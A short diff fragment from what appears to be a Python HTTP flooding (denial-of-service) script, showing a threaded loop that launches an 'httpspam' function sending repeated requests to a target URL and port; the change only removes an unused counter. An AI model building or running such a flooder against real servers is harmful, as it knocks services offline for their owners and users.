@@ -95,7 +95,6 @@ def httpspam():
         s.send(str.encode(req_args))
       print("[+] HTTP request {0} sent to {1}:{2}".format(str(xx),url,str(port)))
 # threading
-count=0
 for i in range(tn):
   t = threading.Thread(target=httpspam)
   print("[+] Thread {0} created".format(str(i)))
